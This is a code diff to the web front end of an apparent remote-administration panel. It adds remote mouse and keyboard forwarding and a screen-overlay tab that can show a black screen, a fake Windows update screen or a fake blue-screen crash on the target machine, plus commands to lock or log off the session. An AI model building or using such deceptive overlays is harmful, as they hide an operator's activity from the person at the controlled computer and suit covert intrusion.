@@ -1019,27 +1019,56 @@ function renderRdpTab(el, device) {
   document.getElementById('rdp-keepawake').addEventListener('change', e => {
     sendRdpMsg({type:'keepawake', enabled: e.target.checked});
   });
-  document.getElementById('rdp-screen-wrap').addEventListener('click', e => {
-    if (!rdpInputEnabled) return;
-    const rect = e.currentTarget.getBoundingClientRect();
+  const screenWrap = document.getElementById('rdp-screen-wrap');
+
+  function rdpImgCoords(e) {
     const img = document.getElementById('rdp-img');
-    if (!img || img.style.display === 'none') return;
-    const imgRect = img.getBoundingClientRect();
-    const scaleX = rdpRemoteW / imgRect.width;
-    const scaleY = rdpRemoteH / imgRect.height;
-    const x = Math.round((e.clientX - imgRect.left) * scaleX);
-    const y = Math.round((e.clientY - imgRect.top) * scaleY);
-    sendRdpMsg({type:'mouse_click', x, y, button: 'left'});
+    if (!img || img.style.display === 'none') return null;
+    const r = img.getBoundingClientRect();
+    return {
+      x: Math.round((e.clientX - r.left) * (rdpRemoteW / r.width)),
+      y: Math.round((e.clientY - r.top)  * (rdpRemoteH / r.height)),
+    };
+  }
+
+  screenWrap.addEventListener('click', e => {
+    if (!rdpInputEnabled) return;
+    const c = rdpImgCoords(e);
+    if (!c) return;
+    sendRdpMsg({type:'remote_input', event:'click', x:c.x, y:c.y, button:0});
   });
-  document.getElementById('rdp-screen-wrap').addEventListener('contextmenu', e => {
+  screenWrap.addEventListener('contextmenu', e => {
     e.preventDefault();
     if (!rdpInputEnabled) return;
-    const img = document.getElementById('rdp-img');
-    if (!img || img.style.display === 'none') return;
-    const imgRect = img.getBoundingClientRect();
-    const x = Math.round((e.clientX - imgRect.left) * (rdpRemoteW / imgRect.width));
-    const y = Math.round((e.clientY - imgRect.top) * (rdpRemoteH / imgRect.height));
-    sendRdpMsg({type:'mouse_click', x, y, button: 'right'});
+    const c = rdpImgCoords(e);
+    if (!c) return;
+    sendRdpMsg({type:'remote_input', event:'click', x:c.x, y:c.y, button:1});
+  });
+
+  let _rdpLastMove = 0;
+  screenWrap.addEventListener('mousemove', e => {
+    if (!rdpInputEnabled) return;
+    const now = Date.now();
+    if (now - _rdpLastMove < 40) return; // cap at ~25fps
+    _rdpLastMove = now;
+    const c = rdpImgCoords(e);
+    if (!c) return;
+    sendRdpMsg({type:'remote_input', event:'move', x:c.x, y:c.y});
+  });
+  screenWrap.addEventListener('wheel', e => {
+    e.preventDefault();
+    if (!rdpInputEnabled) return;
+    sendRdpMsg({type:'remote_input', event:'scroll', dx: Math.round(-e.deltaX/3), dy: Math.round(-e.deltaY/3)});
+  }, {passive: false});
+
+  // Keyboard forwarding — only when RDP screen is focused
+  screenWrap.setAttribute('tabindex', '0');
+  screenWrap.addEventListener('keydown', e => {
+    if (!rdpInputEnabled) return;
+    // Don't swallow browser-critical combos
+    if ((e.ctrlKey && e.key === 'w') || (e.ctrlKey && e.key === 't') || e.key === 'F12') return;
+    e.preventDefault();
+    sendRdpMsg({type:'remote_input', event:'key', key: e.key});
   });
 }
 
@@ -1068,11 +1097,12 @@ function startRdp(device) {
         const img = document.getElementById('rdp-img');
         const ph = document.getElementById('rdp-placeholder');
         if (img) {
+          // agent sends raw base64; prefix it for the data URL
           img.src = 'data:image/jpeg;base64,' + msg.data;
           img.style.display = 'block';
           if (ph) ph.style.display = 'none';
-          if (msg.width) rdpRemoteW = msg.width;
-          if (msg.height) rdpRemoteH = msg.height;
+          if (msg.w) rdpRemoteW = msg.w;
+          if (msg.h) rdpRemoteH = msg.h;
         }
       }
     } catch(_) {}
@@ -1093,49 +1123,94 @@ function sendRdpMsg(msg) {
 
 function renderCurtainTab(el, device) {
   el.innerHTML = `
-  <div class="card" style="max-width:520px">
-    <div class="card-title">Curtain / Screen Control</div>
-    <div class="curtain-form">
-      <div class="form-row">
-        <label>Action</label>
-        <select class="form-control" id="curtain-action">
-          <option value="blank">Blank Screen</option>
-          <option value="unblank">Restore Screen</option>
-          <option value="lock">Lock Session</option>
-          <option value="blanklok">Blank + Lock</option>
-          <option value="logoff">Log Off User</option>
-        </select>
+  <div style="display:flex;flex-direction:column;gap:16px;max-width:640px">
+
+    <div class="card">
+      <div class="card-title">Screen Overlay (tkinter)</div>
+      <p style="font-size:12px;color:var(--muted);margin-bottom:12px">Fullscreen overlays — covers the agent's screen, blocks user interaction</p>
+      <div class="curtain-grid" id="curtain-grid">
+        <button class="curtain-tile" data-action="black">
+          <div class="curtain-tile-preview" style="background:#000"></div>
+          <span>Black Screen</span>
+        </button>
+        <button class="curtain-tile" data-action="update">
+          <div class="curtain-tile-preview" style="background:#1a1a1a;display:flex;align-items:center;justify-content:center">
+            <span style="color:#fff;font-size:9px;text-align:center;line-height:1.4">Working<br>on updates</span>
+          </div>
+          <span>Fake Update</span>
+        </button>
+        <button class="curtain-tile" data-action="config">
+          <div class="curtain-tile-preview" style="background:#1a1a1a;display:flex;align-items:center;justify-content:center">
+            <span style="color:#ccc;font-size:9px;text-align:center;line-height:1.4">Configuring<br>Updates</span>
+          </div>
+          <span>Config Update</span>
+        </button>
+        <button class="curtain-tile" data-action="bsod">
+          <div class="curtain-tile-preview" style="background:#0078D7;display:flex;align-items:flex-start;padding:4px">
+            <span style="color:#fff;font-size:18px;line-height:1">:(</span>
+          </div>
+          <span>Fake BSOD</span>
+        </button>
+        <button class="curtain-tile curtain-tile-remove" data-action="remove">
+          <div class="curtain-tile-preview" style="background:var(--elevated);display:flex;align-items:center;justify-content:center">
+            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+          </div>
+          <span>Remove Overlay</span>
+        </button>
       </div>
-      <div class="form-row">
-        <label>Optional Path / Message</label>
-        <input class="form-control" id="curtain-path" placeholder="Optional…"/>
+      <div style="margin-top:12px;display:flex;gap:8px;align-items:center">
+        <input class="form-control" id="curtain-custom-path" placeholder="Custom image path on agent (e.g. C:\\img.jpg)" style="flex:1"/>
+        <button class="btn btn-secondary btn-sm" id="curtain-custom-btn">Custom Image</button>
       </div>
-      <div class="form-actions" style="justify-content:flex-start">
-        <button class="btn btn-primary" id="curtain-apply">Apply</button>
-      </div>
-      <div class="cmd-output hidden" id="curtain-out"></div>
     </div>
+
+    <div class="card">
+      <div class="card-title">Session Control</div>
+      <div style="display:flex;gap:8px;flex-wrap:wrap">
+        <button class="btn btn-secondary btn-sm" id="curtain-lock-btn">Lock Workstation</button>
+        <button class="btn btn-secondary btn-sm" id="curtain-blanklok-btn">Blank + Lock</button>
+        <button class="btn btn-danger btn-sm" id="curtain-logoff-btn">Log Off User</button>
+      </div>
+    </div>
+
+    <div class="cmd-output hidden" id="curtain-out"></div>
   </div>`;
 
-  document.getElementById('curtain-apply').addEventListener('click', async () => {
-    const action = document.getElementById('curtain-action').value;
-    const path = document.getElementById('curtain-path').value;
-    const out = document.getElementById('curtain-out');
+  const out = document.getElementById('curtain-out');
+
+  async function sendCurtainCmd(shell, command) {
     out.classList.remove('hidden');
     out.textContent = 'Sending…';
     try {
-      let cmd = '';
-      if (action === 'blank') cmd = 'Add-Type -TypeDefinition \'using System;using System.Runtime.InteropServices;public class Disp{[DllImport("user32.dll")]public static extern int SendMessage(int h,int m,int w,int l);}\'; [Disp]::SendMessage(-1,0x0112,0xF170,2)';
-      else if (action === 'unblank') cmd = 'Add-Type -TypeDefinition \'using System;using System.Runtime.InteropServices;public class Disp{[DllImport("user32.dll")]public static extern int SendMessage(int h,int m,int w,int l);}\'; [Disp]::SendMessage(-1,0x0112,0xF170,-1)';
-      else if (action === 'lock') cmd = 'rundll32 user32.dll,LockWorkStation';
-      else if (action === 'blanklok') cmd = 'rundll32 user32.dll,LockWorkStation';
-      else if (action === 'logoff') cmd = 'logoff';
-      if (path) cmd += ' ' + path;
-      const r = await api('POST', `/devices/${device.id}/command`, {shell:'powershell', command: cmd});
-      out.textContent = 'Queued (id=' + r.id + '). Polling…';
+      const r = await api('POST', `/devices/${device.id}/command`, {shell, command});
+      out.textContent = 'Queued (cmd #' + r.id + '). Polling…';
       pollCmdResult(r.id, out);
     } catch(e) { out.textContent = 'Error: ' + e.message; }
+  }
+
+  // Overlay tiles
+  document.getElementById('curtain-grid').addEventListener('click', e => {
+    const btn = e.target.closest('[data-action]');
+    if (!btn) return;
+    sendCurtainCmd('curtain', btn.dataset.action);
   });
+
+  // Custom image
+  document.getElementById('curtain-custom-btn').addEventListener('click', () => {
+    const p = document.getElementById('curtain-custom-path').value.trim();
+    if (!p) { out.classList.remove('hidden'); out.textContent = 'Enter a path first'; return; }
+    sendCurtainCmd('curtain', 'custom:' + p);
+  });
+
+  // Session control buttons
+  document.getElementById('curtain-lock-btn').addEventListener('click', () =>
+    sendCurtainCmd('powershell', 'rundll32 user32.dll,LockWorkStation'));
+  document.getElementById('curtain-blanklok-btn').addEventListener('click', async () => {
+    await sendCurtainCmd('curtain', 'black');
+    await sendCurtainCmd('powershell', 'rundll32 user32.dll,LockWorkStation');
+  });
+  document.getElementById('curtain-logoff-btn').addEventListener('click', () =>
+    sendCurtainCmd('powershell', 'logoff'));
 }
 
 async function renderSoftwareTab(el, deviceId) {
